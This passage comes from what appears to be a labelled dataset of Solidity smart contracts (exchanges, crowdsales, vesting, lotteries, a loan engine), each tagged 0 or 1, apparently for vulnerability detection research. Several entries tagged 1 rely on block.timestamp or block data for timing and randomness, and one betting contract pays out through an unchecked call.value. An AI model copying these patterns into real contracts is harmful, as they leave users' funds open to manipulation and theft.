values[9],            orderHash : 0,            baseToken : addresses[7],            feeToken : addresses[9]            });        uint256 tradeAmount = values[10];                 require(makerOrder.expires >= block.number && takerOrder.expires >= block.number);                 require(makerOrder.baseToken == takerOrder.baseToken && makerOrder.tokenBuy == takerOrder.tokenSell && makerOrder.tokenSell == takerOrder.tokenBuy);        require(takerOrder.baseToken == takerOrder.tokenBuy || takerOrder.baseToken == takerOrder.tokenSell);        makerOrder.orderHash = getOrderHash(makerOrder.tokenBuy, makerOrder.amountBuy, makerOrder.tokenSell, makerOrder.amountSell, makerOrder.baseToken, makerOrder.expires, makerOrder.nonce, makerOrder.feeToken);        takerOrder.orderHash = getOrderHash(takerOrder.tokenBuy, takerOrder.amountBuy, takerOrder.tokenSell, takerOrder.amountSell, takerOrder.baseToken, takerOrder.expires, takerOrder.nonce, takerOrder.feeToken);        require(ecrecover(keccak256("\x19Ethereum Signed Message:\n32", makerOrder.orderHash), v[0], r[0], s[0]) == makerOrder.user);        require(ecrecover(keccak256("\x19Ethereum Signed Message:\n32", takerOrder.orderHash), v[1], r[1], s[1]) == takerOrder.user);        balance(makerOrder, takerOrder, addresses[10], tradeAmount);    }    function balance(Order makerOrder, Order takerOrder, address feeAccount, uint256 tradeAmount) internal {                          require(safeMul(makerOrder.amountSell, takerOrder.amountSell) >= safeMul(makerOrder.amountBuy, takerOrder.amountBuy));                 uint256 takerBuy = 0;        uint256 takerSell = 0;        if (takerOrder.baseToken == takerOrder.tokenBuy) {                         uint256 makerAmount = safeSub(makerOrder.amountBuy, orderFilled[makerOrder.user][makerOrder.orderHash]);            uint256 takerAmount = safeSub(takerOrder.amountSell, orderFilled[takerOrder.user][takerOrder.orderHash]);            require(tradeAmount > 0 && tradeAmount <= makerAmount && tradeAmount <= takerAmount);            takerSell = tradeAmount;            takerBuy = safeMul(makerOrder.amountSell, takerSell) / makerOrder.amountBuy;            orderFilled[takerOrder.user][takerOrder.orderHash] = safeAdd(orderFilled[takerOrder.user][takerOrder.orderHash], takerSell);            orderFilled[makerOrder.user][makerOrder.orderHash] = safeAdd(orderFilled[makerOrder.user][makerOrder.orderHash], takerSell);        } else {                         takerAmount = safeSub(takerOrder.amountBuy, orderFilled[takerOrder.user][takerOrder.orderHash]);            makerAmount = safeSub(makerOrder.amountSell, orderFilled[makerOrder.user][makerOrder.orderHash]);            require(tradeAmount > 0 && tradeAmount <= makerAmount && tradeAmount <= takerAmount);            takerBuy = tradeAmount;            takerSell = safeMul(makerOrder.amountBuy, takerBuy) / makerOrder.amountSell;            orderFilled[takerOrder.user][takerOrder.orderHash] = safeAdd(orderFilled[takerOrder.user][takerOrder.orderHash], takerBuy);            orderFilled[makerOrder.user][makerOrder.orderHash] = safeAdd(orderFilled[makerOrder.user][makerOrder.orderHash], takerBuy);        }        uint256 makerFee = chargeFee(makerOrder, feeAccount, takerSell);        uint256 takerFee = chargeFee(takerOrder, feeAccount, takerBuy);                 tokenList[takerOrder.tokenSell][takerOrder.user] = safeSub(tokenList[takerOrder.tokenSell][takerOrder.user], takerSell);                 tokenList[takerOrder.tokenBuy][takerOrder.user] = safeAdd(tokenList[takerOrder.tokenBuy][takerOrder.user], safeSub(takerBuy, takerFee));                 tokenList[makerOrder.tokenSell][makerOrder.user] = safeSub(tokenList[makerOrder.tokenSell][makerOrder.user], takerBuy);                 tokenList[makerOrder.tokenBuy][makerOrder.user] = safeAdd(tokenList[makerOrder.tokenBuy][makerOrder.user], safeSub(takerSell, makerFee));    }              function chargeFee(Order order, address feeAccount, uint256 amountBuy) internal returns (uint256){        uint256 classicFee = 0;        if (order.feeToken != 0) {                                      require(order.fee <= tokenList[order.feeToken][order.user]);            tokenList[order.feeToken][feeAccount] = safeAdd(tokenList[order.feeToken][feeAccount], order.fee);            tokenList[order.feeToken][order.user] = safeSub(tokenList[order.feeToken][order.user], order.fee);        } else {            classicFee = order.fee;            require(safeMul(order.fee, feeRate) <= amountBuy);            tokenList[order.tokenBuy][feeAccount] = safeAdd(tokenList[order.tokenBuy][feeAccount], order.fee);        }        return classicFee;    }    function batchTrade(        address[11][] addresses,        uint256[11][] values,        uint8[2][] v,        bytes32[2][] r,        bytes32[2][] s    ) public onlyAdmin {        for (uint i = 0; i < addresses.length; i++) {            trade(addresses[i], values[i], v[i], r[i], s[i]);        }    }         function refund(address user, address[] tokens) public onlyAdmin {        for (uint i = 0; i < tokens.length; i++) {            address token = tokens[i];            uint256 amount = tokenList[token][user];            if (amount > 0) {                tokenList[token][user] = 0;                if (token == 0) {                     require(user.send(amount));                } else {                     require(Token(token).transfer(user, amount));                }                Withdraw(token, user, amount, tokenList[token][user]);            }        }    }}
1<CODESPLIT>contract dappVolumeAd { using SafeMath for uint256;	 	uint256 public dappId;	uint256 public purchaseTimestamp;	uint256 public purchaseSeconds;	uint256 public investmentMin;	uint256 public adPriceHour;	uint256 public adPriceHalfDay;	uint256 public adPriceDay;	uint256 public adPriceWeek;	uint256 public adPriceMultiple;	address public contractOwner;	address public lastOwner;	address public theInvestor;	 	modifier onlyContractOwner {		require(msg.sender == contractOwner);		_;	}	 	constructor() public {		investmentMin = 1000000000000000;		adPriceHour = 5000000000000000;		adPriceHalfDay = 50000000000000000;		adPriceDay = 100000000000000000;		adPriceWeek = 500000000000000000;		adPriceMultiple = 1;		contractOwner = msg.sender;		theInvestor = contractOwner;		lastOwner = contractOwner;	}	 	function withdraw() public onlyContractOwner {		contractOwner.transfer(address(this).balance);	}	 	function setAdPriceMultiple(uint256 amount) public onlyContractOwner {		adPriceMultiple = amount;	}	 	function updateAd(uint256 id) public payable {		 		require(msg.value >= adPriceMultiple.mul(adPriceHour));		require(block.timestamp > purchaseTimestamp + purchaseSeconds);		require(id > 0);		 		if (msg.value >= adPriceMultiple.mul(adPriceWeek)) {			purchaseSeconds = 604800;  		} else if (msg.value >= adPriceMultiple.mul(adPriceDay)) {			purchaseSeconds = 86400;  		} else if (msg.value >= adPriceMultiple.mul(adPriceHalfDay)) {			purchaseSeconds = 43200;  		} else {			purchaseSeconds = 3600;  		}		 		purchaseTimestamp = block.timestamp;		 		lastOwner.transfer(msg.value.div(2));		 		theInvestor.transfer(msg.value.div(10));		 		lastOwner = msg.sender;		 		dappId = id;	}	 	function updateInvestor() public payable {		require(msg.value >= investmentMin);		theInvestor.transfer(msg.value.div(100).mul(60));  		theInvestor = msg.sender;  		investmentMin = investmentMin.mul(2);  	}	 	function getPurchaseTimestampEnds() public view returns (uint _getPurchaseTimestampAdEnds) {		return purchaseTimestamp.add(purchaseSeconds);	}	 	function getBalance() public view returns(uint256){		return address(this).balance;	}}
0<CODESPLIT>contract NeuroChainClausius {  event FreezeStatusChanged(bool toStatus, uint timestamp);  bool public tradingLive = false;  function setTradingStatus(bool isLive) public {    tradingLive = isLive;    FreezeStatusChanged(tradingLive, block.timestamp);    return;  }}
1<CODESPLIT>contract BSPMintable is Ownable {  using SafeMath for uint256;  using SafeERC20 for ERC20Basic;  event Mint(uint256 amount);  event DistributorChanged(address indexed previousDistributor, address indexed newDistributor);  address public distributor = 0x4F91C1f068E0dED2B7fF823289Add800E1c26Fc3;     ERC20Basic public BSPToken = ERC20Basic(0x5d551fA77ec2C7dd1387B626c4f33235c3885199);     uint256 constant public rewardAmount = 630000000 * (10 ** 18);     uint256 constant public duration = 4 years;     uint256[4] public miningRate = [40,20,20,20];  bool public started = false;  uint256 public startTime;  uint256 public minted;  modifier whenStarted() {    require(started == true && startTime <= block.timestamp);    _;  }  function startMining(uint256 _startTime) public onlyOwner {      require(started == false && BSPToken.balanceOf(this) >= rewardAmount);             require(_startTime >= block.timestamp);             require(_startTime <= block.timestamp + 60 days);      startTime = _startTime;      started = true;  }  function changeDistributor(address _newDistributor) public onlyOwner {    emit DistributorChanged(distributor, _newDistributor);    distributor = _newDistributor;  }  function mint() public whenStarted {    uint256 unminted = mintableAmount();    require(unminted > 0);    minted = minted.add(unminted);    BSPToken.safeTransfer(distributor, unminted);    emit Mint(unminted);  }  function mintableAmount() public view returns (uint256) {    if(started == false || startTime >= block.timestamp){        return 0;    }    if (block.timestamp >= startTime.add(duration)){        return BSPToken.balanceOf(this);    }    uint currentYear = block.timestamp.sub(startTime).div(1 years);    uint currentDay = (block.timestamp.sub(startTime) % (1 years)).div(1 days);    uint currentMintable = 0;    for (uint i = 0; i < currentYear; i++){        currentMintable = currentMintable.add(rewardAmount.mul(miningRate[i]).div(100));    }    currentMintable = currentMintable.add(rewardAmount.mul(miningRate[currentYear]).div(36500).mul(currentDay));    return currentMintable.sub(minted);  }  function totalBspAmount() public view returns (uint256) {      return BSPToken.balanceOf(this).add(minted);  }  function () public payable {    revert ();  }}
0<CODESPLIT>contract FreedomEthereum {    mapping (address => uint) public hodlers;    uint constant partyTime = 1554098401;    function party() {        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);        uint value = hodlers[msg.sender];        hodlers[msg.sender] = 0;        msg.sender.transfer(value);        return;    }}
1<CODESPLIT>contract BSPVesting {  using SafeMath for uint256;  using SafeERC20 for ERC20Basic;  event Released(uint256 amount);     address public beneficiary = 0xb790f6DBd477C7125b13a8Bb3a67771027Abd402;     ERC20Basic public BSPToken = ERC20Basic(0x5d551fA77ec2C7dd1387B626c4f33235c3885199);     uint256 public start = 1577808000;     uint256 public duration = 15 * 30 days;  uint256 public released;  function release() public {    uint256 unreleased = releasableAmount();    require(unreleased > 0);    released = released.add(unreleased);    BSPToken.safeTransfer(beneficiary, unreleased);    emit Released(unreleased);  }  function releasableAmount() public view returns (uint256) {    return vestedAmount().sub(released);  }  function vestedAmount() public view returns (uint256) {    uint256 currentBalance = BSPToken.balanceOf(this);    uint256 totalBalance = currentBalance.add(released);    if (block.timestamp >= start.add(duration)) {      return totalBalance;    } else {      return totalBalance.mul(block.timestamp.sub(start)).div(duration);    }  }  function () public payable {    revert ();  }}
1<CODESPLIT>contract Greedy {    uint256 public luckybuyTracker_ = 0;    function luckyBuy() private view returns(bool) {        uint256 seed = uint256(keccak256(abi.encodePacked((block.timestamp) + (block.difficulty))));        if((seed - ((seed / 1000) * 1000)) < luckybuyTracker_)            return(true);        else            return(false);    }}
1<CODESPLIT>contract HorseTokenCrowdsale{    uint256 public fundingStartTime;    uint256 public fundingEndTime;    bool    public areFundsReleasedToBeneficiary   = false;    function checkGoalReached() public returns (bytes32 response) {        if (block.timestamp <= fundingEndTime && block.timestamp >= fundingStartTime) {            areFundsReleasedToBeneficiary = false;            return "Eth < Softcap";        }    }}
1<CODESPLIT>contract RandomApi {    uint64 _seed = 0;    function random256() public returns (uint256 randomNumber) {        uint256 rand = uint256(keccak256(keccak256(block.blockhash(block.number - 1), _seed), block.timestamp));        _seed = uint64(rand);        return rand;    }}
0<CODESPLIT>contract ProofOfLongHodl {    address owner;    uint private weeklyTicketsBought = 0;    uint private weeklyTicketThatWon;    bool private weeklyTicketSelected;    function drawWeeklyWinner() public {        uint256 seed = weeklyTicketsBought + block.timestamp;        weeklyTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, weeklyTicketsBought);        weeklyTicketSelected = true;        return;    }}
0<CODESPLIT>contract GStarToken is StandardToken, Ownable {    using SafeMath for uint256;    string public constant name = "GSTAR Token";    string public constant symbol = "GSTAR";    uint8 public constant decimals = 18;    uint256 public constant INITIAL_SUPPLY = 1600000000 * ((10 ** uint256(decimals)));    uint256 public currentTotalSupply = 0;    event Burn(address indexed burner, uint256 value);         function GStarToken() public {        owner = msg.sender;        totalSupply_ = INITIAL_SUPPLY;        balances[owner] = INITIAL_SUPPLY;        currentTotalSupply = INITIAL_SUPPLY;        emit Transfer(address(0), owner, INITIAL_SUPPLY);    }         function burn(uint256 value) public onlyOwner {        require(value <= balances[msg.sender]);        address burner = msg.sender;        balances[burner] = balances[burner].sub(value);        currentTotalSupply = currentTotalSupply.sub(value);        emit Burn(burner, value);    }} 
1<CODESPLIT>contract GStarCrowdsale is WhitelistedCrowdsale {    using SafeMath for uint256;              uint256 constant public presaleStartTime = 1531051200;      uint256 constant public startTime = 1532260800;      uint256 constant public endTime = 1534593600;           mapping (address => uint256) public depositedTokens;              uint256 constant public MINIMUM_PRESALE_PURCHASE_AMOUNT_IN_WEI = 1 ether;    uint256 constant public MINIMUM_PURCHASE_AMOUNT_IN_WEI = 0.1 ether;         uint256 public tokensWeiRaised = 0;         uint256 constant public fundingGoal = 76000 ether;    uint256 constant public presaleFundingGoal = 1000 ether;    bool public fundingGoalReached = false;    bool public presaleFundingGoalReached = false;         uint256 public privateContribution = 0;         bool public crowdsaleActive = false;    bool public isCrowdsaleClosed = false;    uint256 public tokensReleasedAmount = 0;                   event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);    event GoalReached(uint256 totalEtherAmountRaised);    event PresaleGoalReached(uint256 totalEtherAmountRaised);    event StartCrowdsale();    event StopCrowdsale();    event ReleaseTokens(address[] _beneficiaries);    event Close();         function GStarCrowdsale (        uint256 _rate,        address _wallet,        GStarToken token        ) public Crowdsale(_rate, _wallet, token) {    }                        function buyTokens(address _beneficiary) public payable {        uint256 weiAmount = msg.value;        _preValidatePurchase(_beneficiary, weiAmount);                 uint256 tokens = _getTokenAmount(weiAmount);                 weiRaised = weiRaised.add(weiAmount);                emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);        _updatePurchasingState(_beneficiary, weiAmount);        _forwardFunds();        _processPurchase(_beneficiary, weiAmount);    }         function getRate() public view returns (uint256) {                 if (block.timestamp <= startTime) { return ((rate / 100) * 120); }          if (block.timestamp <= startTime.add(1 days)) {return ((rate / 100) * 108);}          return rate;    }                        function changePrivateContribution(uint256 etherWeiAmount) external onlyOwner {        privateContribution = etherWeiAmount;    }         function startCrowdsale() external onlyOwner {        require(!crowdsaleActive);        require(!isCrowdsaleClosed);        crowdsaleActive = true;        emit StartCrowdsale();    }         function stopCrowdsale() external onlyOwner {        require(crowdsaleActive);        crowdsaleActive = false;        emit StopCrowdsale();    }         function releaseTokens(address[] contributors) external onlyOwner {        for (uint256 j = 0; j < contributors.length; j++) {                         uint256 tokensAmount = depositedTokens[contributors[j]];            if (tokensAmount > 0) {                super._deliverTokens(contributors[j], tokensAmount);                depositedTokens[contributors[j]] = 0;                                 tokensReleasedAmount = tokensReleasedAmount.add(tokensAmount);            }        }    }         function close() external onlyOwner {        crowdsaleActive = false;        isCrowdsaleClosed = true;                token.transfer(owner, token.balanceOf(address(this)));        emit Close();    }                        function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {        bool withinPeriod = now >= presaleStartTime && now <= endTime;        bool atLeastMinimumAmount = false;        if(block.timestamp <= startTime) {                         require(_weiAmount.add(weiRaised.add(privateContribution)) <= presaleFundingGoal);            atLeastMinimumAmount = _weiAmount >= MINIMUM_PRESALE_PURCHASE_AMOUNT_IN_WEI;                    } else {                         atLeastMinimumAmount = _weiAmount >= MINIMUM_PURCHASE_AMOUNT_IN_WEI;        }        super._preValidatePurchase(_beneficiary, _weiAmount);        require(msg.sender == _beneficiary);        require(_weiAmount.add(weiRaised.add(privateContribution)) <= fundingGoal);        require(withinPeriod);        require(atLeastMinimumAmount);        require(crowdsaleActive);    }         function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {        return _weiAmount.mul(getRate());    }         function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {        tokensWeiRaised = tokensWeiRaised.add(_getTokenAmount(_weiAmount));        _updateFundingGoal();    }         function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {        depositedTokens[_beneficiary] = depositedTokens[_beneficiary].add(_getTokenAmount(_tokenAmount));    }         function _updateFundingGoal() internal {        if (weiRaised.add(privateContribution) >= fundingGoal) {            fundingGoalReached = true;            emit GoalReached(weiRaised.add(privateContribution));        }        if(block.timestamp <= startTime) {            if(weiRaised.add(privateContribution) >= presaleFundingGoal) {                                presaleFundingGoalReached = true;                emit PresaleGoalReached(weiRaised.add(privateContribution));            }        }    }}
1<CODESPLIT>contract BlocksquareSeriesA {    uint256 public startTime;    uint256 public endTime;    bool icoHasStarted;    function start() public {        startTime = block.timestamp;        endTime = startTime + (60*60) + (60*60*24*16);        icoHasStarted = true;        return;    }}
1<CODESPLIT>contract SPCoin {    uint256 public pre_startdate;    uint bonusCalculationFactor;    function bonuscalpre() private returns (uint256 cp) {      uint bon = 30;      bonusCalculationFactor = (block.timestamp - (pre_startdate)) / (86400);      if(bonusCalculationFactor == 0) {          bon = 30;      }      else{          bon -= bonusCalculationFactor * 2;      }      return bon;    }}
1<CODESPLIT>contract StupidCrowdsale {    uint256 constant public START = 1514764800;    function getRate() public returns (uint16) {        if (block.timestamp < START)            return 1000;        return 500;    }}
1<CODESPLIT>contract SimpleBet {	address gameOwner = address(0);	bool locked = false;	function bet() payable	{		if ((random()%2==1) && (msg.value == 1 ether) && (!locked))		{			if (!msg.sender.call.value(2 ether)())				throw;		}	}	function lock()	{		if (gameOwner==msg.sender)		{			locked = true;		}	}	function unlock()	{		if (gameOwner==msg.sender)		{			locked = false;		}	}	function own(address owner)	{		if ((gameOwner == address(0)) || (gameOwner == msg.sender))		{			gameOwner = owner;		}	}	function releaseFunds(uint amount)	{		if (gameOwner==msg.sender)		{			msg.sender.transfer( amount * (1 ether));		}	}	function random() view returns (uint8) {        	return uint8(uint256(keccak256(block.timestamp, block.difficulty))%256);    	}	function () public  payable	{		bet();	}}
0<CODESPLIT>contract Engine {    uint256 public VERSION;    string public VERSION_NAME;    enum Status { initial, lent, paid, destroyed }    struct Approbation {        bool approved;        bytes data;        bytes32 checksum;    }    function getTotalLoans() public view returns (uint256);    function getOracle(uint index) public view returns (Oracle);    function getBorrower(uint index) public view returns (address);    function getCosigner(uint index) public view returns (address);    function ownerOf(uint256) public view returns (address owner);    function getCreator(uint index) public view returns (address);    function getAmount(uint index) public view returns (uint256);    function getPaid(uint index) public view returns (uint256);    function getDueTime(uint index) public view returns (uint256);    function getApprobation(uint index, address _address) public view returns (bool);    function getStatus(uint index) public view returns (Status);    function isApproved(uint index) public view returns (bool);    function getPendingAmount(uint index) public returns (uint256);    function getCurrency(uint index) public view returns (bytes32);    function cosign(uint index, uint256 cost) external returns (bool);    function approveLoan(uint index) public returns (bool);    function transfer(address to, uint256 index) public returns (bool);    function takeOwnership(uint256 index) public returns (bool);    function withdrawal(uint index, address to, uint256 amount) public returns (bool);} 
0<CODESPLIT>contract Cosigner {    uint256 public constant VERSION = 2;             function url() public view returns (string);             function cost(address engine, uint256 index, bytes data, bytes oracleData) public view returns (uint256);             function requestCosign(Engine engine, uint256 index, bytes data, bytes oracleData) public returns (bool);             function claim(address engine, uint256 index, bytes oracleData) public returns (bool);}
0<CODESPLIT>contract Oracle is Ownable {    uint256 public constant VERSION = 3;    event NewSymbol(bytes32 _currency, string _ticker);        struct Symbol {        string ticker;        bool supported;    }    mapping(bytes32 => Symbol) public currencies;         function url() public view returns (string);         function getRate(bytes32 symbol, bytes data) public returns (uint256 rate, uint256 decimals);         function addCurrency(string ticker) public onlyOwner returns (bytes32) {        NewSymbol(currency, ticker);        bytes32 currency = keccak256(ticker);        currencies[currency] = Symbol(ticker, true);        return currency;    }         function supported(bytes32 symbol) public view returns (bool) {        return currencies[symbol].supported;    }}
0<CODESPLIT>contract RpSafeMath {    function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {      uint256 z = x + y;      require((z >= x) && (z >= y));      return z;    }    function safeSubtract(uint256 x, uint256 y) internal pure returns(uint256) {      require(x >= y);      uint256 z = x - y;      return z;    }    function safeMult(uint256 x, uint256 y) internal pure returns(uint256) {      uint256 z = x * y;      require((x == 0)||(z/x == y));      return z;    }    function min(uint256 a, uint256 b) internal pure returns(uint256) {        if (a < b) {           return a;        } else {           return b;         }    }        function max(uint256 a, uint256 b) internal pure returns(uint256) {        if (a > b) {           return a;        } else {           return b;         }    }}
0<CODESPLIT>contract TokenLockable is RpSafeMath, Ownable {    mapping(address => uint256) public lockedTokens;         function lockTokens(address token, uint256 amount) internal {        lockedTokens[token] = safeAdd(lockedTokens[token], amount);    }         function unlockTokens(address token, uint256 amount) internal {        lockedTokens[token] = safeSubtract(lockedTokens[token], amount);    }         function withdrawTokens(Token token, address to, uint256 amount) public onlyOwner returns (bool) {        require(safeSubtract(token.balanceOf(this), lockedTokens[token]) >= amount);        require(to != address(0));        return token.transfer(to, amount);    }}
1<CODESPLIT>contract NanoLoanEngine is ERC721, Engine, Ownable, TokenLockable {    uint256 constant internal PRECISION = (10**18);    uint256 constant internal RCN_DECIMALS = 18;    uint256 public constant VERSION = 233;    string public constant VERSION_NAME = "Basalt";    uint256 private activeLoans = 0;    mapping(address => uint256) private lendersBalance;    function name() public view returns (string _name) {        _name = "RCN - Nano loan engine - Basalt 233";    }    function symbol() public view returns (string _symbol) {        _symbol = "RCN-NLE-233";    }         function totalSupply() public view returns (uint _totalSupply) {        _totalSupply = activeLoans;    }         function balanceOf(address _owner) public view returns (uint _balance) {        _balance = lendersBalance[_owner];    }         function tokensOfOwner(address _owner) external view returns(uint256[] ownerTokens) {        uint256 tokenCount = balanceOf(_owner);        if (tokenCount == 0) {                         return new uint256[](0);        } else {            uint256[] memory result = new uint256[](tokenCount);            uint256 totalLoans = loans.length - 1;            uint256 resultIndex = 0;            uint256 loanId;            for (loanId = 0; loanId <= totalLoans; loanId++) {                if (loans[loanId].lender == _owner && loans[loanId].status == Status.lent) {                    result[resultIndex] = loanId;                    resultIndex++;                }            }            return result;        }    }         function isApprovedForAll(address _owner, address _operator) public view returns (bool) {        return operators[_owner][_operator];    }         function tokenMetadata(uint256 index) public view returns (string) {        return loans[index].metadata;    }         function tokenMetadataHash(uint256 index) public view returns (bytes32) {        return keccak256(loans[index].metadata);    }    Token public rcn;    bool public deprecated;    event CreatedLoan(uint _index, address _borrower, address _creator);    event ApprovedBy(uint _index, address _address);    event Lent(uint _index, address _lender, address _cosigner);    event DestroyedBy(uint _index, address _address);    event PartialPayment(uint _index, address _sender, address _from, uint256 _amount);    event TotalPayment(uint _index);    function NanoLoanEngine(Token _rcn) public {        owner = msg.sender;        rcn = _rcn;                 loans.length++;    }    struct Loan {        Status status;        Oracle oracle;        address borrower;        address lender;        address creator;        address cosigner;                uint256 amount;        uint256 interest;        uint256 punitoryInterest;        uint256 interestTimestamp;        uint256 paid;        uint256 interestRate;        uint256 interestRatePunitory;        uint256 dueTime;        uint256 duesIn;        bytes32 currency;        uint256 cancelableAt;        uint256 lenderBalance;        address approvedTransfer;        uint256 expirationRequest;        string metadata;        mapping(address => bool) approbations;    }    mapping(address => mapping(address => bool)) private operators;    mapping(bytes32 => uint256) public identifierToIndex;    Loan[] private loans;         function createLoan(Oracle _oracleContract, address _borrower, bytes32 _currency, uint256 _amount, uint256 _interestRate,        uint256 _interestRatePunitory, uint256 _duesIn, uint256 _cancelableAt, uint256 _expirationRequest, string _metadata) public returns (uint256) {        require(!deprecated);        require(_cancelableAt <= _duesIn);        require(_oracleContract != address(0) || _currency == 0x0);        require(_borrower != address(0));        require(_amount != 0);        require(_interestRatePunitory != 0);        require(_interestRate != 0);        require(_expirationRequest > block.timestamp);        var loan = Loan(Status.initial, _oracleContract, _borrower, 0x0, msg.sender, 0x0, _amount, 0, 0, 0, 0, _interestRate,            _interestRatePunitory, 0, _duesIn, _currency, _cancelableAt, 0, 0x0, _expirationRequest, _metadata);        uint index = loans.push(loan) - 1;        CreatedLoan(index, _borrower, msg.sender);        bytes32 identifier = getIdentifier(index);        require(identifierToIndex[identifier] == 0);        identifierToIndex[identifier] = index;        if (msg.sender == _borrower) {            approveLoan(index);        }        return index;    }        function ownerOf(uint256 index) public view returns (address owner) { owner = loans[index].lender; }    function getTotalLoans() public view returns (uint256) { return loans.length; }    function getOracle(uint index) public view returns (Oracle) { return loans[index].oracle; }    function getBorrower(uint index) public view returns (address) { return loans[index].borrower; }    function getCosigner(uint index) public view returns (address) { return loans[index].cosigner; }    function getCreator(uint index) public view returns (address) { return loans[index].creator; }    function getAmount(uint index) public view returns (uint256) { return loans[index].amount; }    function getPunitoryInterest(uint index) public view returns (uint256) { return loans[index].punitoryInterest; }    function getInterestTimestamp(uint index) public view returns (uint256) { return loans[index].interestTimestamp; }    function getPaid(uint index) public view returns (uint256) { return loans[index].paid; }    function getInterestRate(uint index) public view returns (uint256) { return loans[index].interestRate; }    function getInterestRatePunitory(uint index) public view returns (uint256) { return loans[index].interestRatePunitory; }    function getDueTime(uint index) public view returns (uint256) { return loans[index].dueTime; }    function getDuesIn(uint index) public view returns (uint256) { return loans[index].duesIn; }    function getCancelableAt(uint index) public view returns (uint256) { return loans[index].cancelableAt; }    function getApprobation(uint index, address _address) public view returns (bool) { return loans[index].approbations[_address]; }    function getStatus(uint index) public view returns (Status) { return loans[index].status; }    function getLenderBalance(uint index) public view returns (uint256) { return loans[index].lenderBalance; }    function getApproved(uint index) public view returns (address) {return loans[index].approvedTransfer; }    function getCurrency(uint index) public view returns (bytes32) { return loans[index].currency; }    function getExpirationRequest(uint index) public view returns (uint256) { return loans[index].expirationRequest; }    function getInterest(uint index) public view returns (uint256) { return loans[index].interest; }    function getIdentifier(uint index) public view returns (bytes32) {        Loan memory loan = loans[index];        return buildIdentifier(loan.oracle, loan.borrower, loan.creator, loan.currency, loan.amount, loan.interestRate,            loan.interestRatePunitory, loan.duesIn, loan.cancelableAt, loan.expirationRequest, loan.metadata);    }         function buildIdentifier(Oracle oracle, address borrower, address creator, bytes32 currency, uint256 amount, uint256 interestRate,        uint256 interestRatePunitory, uint256 duesIn, uint256 cancelableAt, uint256 expirationRequest, string metadata) view returns (bytes32) {        return keccak256(this, oracle, borrower, creator, currency, amount, interestRate, interestRatePunitory, duesIn,                        cancelableAt, expirationRequest, metadata);     }         function isApproved(uint index) public view returns (bool) {        Loan storage loan = loans[index];        return loan.approbations[loan.borrower];    }         function approveLoan(uint index) public returns(bool) {        Loan storage loan = loans[index];        require(loan.status == Status.initial);        loan.approbations[msg.sender] = true;        ApprovedBy(index, msg.sender);        return true;    }         function approveLoanIdentifier(bytes32 identifier) public returns (bool) {        uint256 index = identifierToIndex[identifier];        require(index != 0);        return approveLoan(index);    }         function registerApprove(bytes32 identifier, uint8 v, bytes32 r, bytes32 s) public returns (bool) {        uint256 index = identifierToIndex[identifier];        require(index != 0);        Loan storage loan = loans[index];        require(loan.borrower == ecrecover(keccak256("\x19Ethereum Signed Message:\n32", identifier), v, r, s));        loan.approbations[loan.borrower] = true;        ApprovedBy(index, loan.borrower);        return true;    }         function lend(uint index, bytes oracleData, Cosigner cosigner, bytes cosignerData) public returns (bool) {        Loan storage loan = loans[index];        require(loan.status == Status.initial);        require(isApproved(index));        require(block.timestamp <= loan.expirationRequest);        loan.lender = msg.sender;        loan.dueTime = safeAdd(block.timestamp, loan.duesIn);        loan.interestTimestamp = block.timestamp;        loan.status = Status.lent;                 Transfer(0x0, loan.lender, index);        activeLoans += 1;        lendersBalance[loan.lender] += 1;                if (loan.cancelableAt > 0)            internalAddInterest(loan, safeAdd(block.timestamp, loan.cancelableAt));                          uint256 transferValue = convertRate(loan.oracle, loan.currency, oracleData, loan.amount);        require(rcn.transferFrom(msg.sender, loan.borrower, transferValue));                if (cosigner != address(0)) {                                                   loan.cosigner = address(uint256(cosigner) + 2);            require(cosigner.requestCosign(this, index, cosignerData, oracleData));            require(loan.cosigner == address(cosigner));        }                        Lent(index, loan.lender, cosigner);        return true;    }         function cosign(uint index, uint256 cost) external returns (bool) {        Loan storage loan = loans[index];        require(loan.status == Status.lent && (loan.dueTime - loan.duesIn) == block.timestamp);        require(loan.cosigner != address(0));        require(loan.cosigner == address(uint256(msg.sender) + 2));        loan.cosigner = msg.sender;        require(rcn.transferFrom(loan.lender, msg.sender, cost));        return true;    }         function destroy(uint index) public returns (bool) {        Loan storage loan = loans[index];        require(loan.status != Status.destroyed);        require(msg.sender == loan.lender || (msg.sender == loan.borrower && loan.status == Status.initial));        DestroyedBy(index, msg.sender);                 if (loan.status != Status.initial) {            lendersBalance[loan.lender] -= 1;            activeLoans -= 1;            Transfer(loan.lender, 0x0, index);        }        loan.status = Status.destroyed;        return true;    }         function destroyIdentifier(bytes32 identifier) public returns (bool) {        uint256 index = identifierToIndex[identifier];        require(index != 0);        return destroy(index);    }         function transfer(address to, uint256 index) public returns (bool) {        Loan storage loan = loans[index];                require(msg.sender == loan.lender || msg.sender == loan.approvedTransfer || operators[loan.lender][msg.sender]);        require(to != address(0));                 lendersBalance[loan.lender] -= 1;        lendersBalance[to] += 1;        Transfer(loan.lender, to, index);        loan.lender = to;        loan.approvedTransfer = address(0);        return true;    }         function takeOwnership(uint256 _index) public returns (bool) {        return transfer(msg.sender, _index);    }         function transferFrom(address from, address to, uint256 index) public returns (bool) {        require(loans[index].lender == from);        return transfer(to, index);    }         function approve(address to, uint256 index) public returns (bool) {        Loan storage loan = loans[index];        require(msg.sender == loan.lender);        loan.approvedTransfer = to;        Approval(msg.sender, to, index);        return true;    }         function setApprovalForAll(address _operator, bool _approved) public returns (bool) {        operators[msg.sender][_operator] = _approved;        ApprovalForAll(msg.sender, _operator, _approved);        return true;    }         function getPendingAmount(uint index) public returns (uint256) {        addInterest(index);        return getRawPendingAmount(index);    }         function getRawPendingAmount(uint index) public view returns (uint256) {        Loan memory loan = loans[index];        return safeSubtract(safeAdd(safeAdd(loan.amount, loan.interest), loan.punitoryInterest), loan.paid);    }         function calculateInterest(uint256 timeDelta, uint256 interestRate, uint256 amount) internal pure returns (uint256 realDelta, uint256 interest) {        if (amount == 0) {            interest = 0;            realDelta = timeDelta;        } else {            interest = safeMult(safeMult(100000, amount), timeDelta) / interestRate;            realDelta = safeMult(interest, interestRate) / (amount * 100000);        }    }         function internalAddInterest(Loan storage loan, uint256 